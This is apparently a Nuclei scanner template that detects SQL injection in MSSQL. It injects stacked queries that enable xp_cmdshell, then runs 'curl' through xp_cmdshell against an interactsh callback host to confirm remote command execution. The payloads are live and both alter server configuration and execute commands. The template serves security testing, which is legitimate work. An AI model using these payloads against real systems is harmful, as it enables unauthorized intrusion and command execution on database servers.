http:
- method: GET
  path:
  - '{{BaseURL}}/?id=1; EXEC sp_configure ''show advanced options'',1;RECONFIGURE;EXEC
    sp_configure ''xp_cmdshell'',1;RECONFIGURE--'
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}/?id=1; exec master..xp_cmdshell ''curl http://{{interactsh-url}}''--'
  stop-at-first-match: true
id: ai-mssql-enable-xp-cmdshell-oob
info:
  author: reewardius
  name: MSSQL enable and test xp_cmdshell OOB
  severity: critical
  tags: mssql,sqli,rce,oob
